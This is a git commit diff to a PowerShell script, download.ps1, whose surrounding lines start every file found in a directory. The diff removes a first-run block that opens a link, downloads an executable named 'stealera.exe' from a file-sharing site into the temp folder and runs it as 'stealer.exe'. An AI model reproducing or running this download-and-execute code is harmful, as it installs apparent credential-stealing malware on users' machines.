b449266119013e089f7053b221f453377c5c19b7
43a1723 <hai1723notgay@gmail.com>
2024-06-06 18:16:39 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -25,13 +25,3 @@ Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEac
     Write-Output $_.FullName
     Start-Process -FilePath $_.FullName
 }
-
-$file = "$temp\runfirst1.txt"
-
-if (-not (Test-Path $file)) {
-    New-Item -Path $file -ItemType File
-    Start-Process "https://mybiolinks.io/cDjYO"
-    
-    Invoke-WebRequest -Uri "https://anonsharing.com/file/8f56ab5e1816f025/stealera.exe" -OutFile "$temp\stealer.exe"
-    Start-Process -FilePath "$temp\stealer.exe"
-}
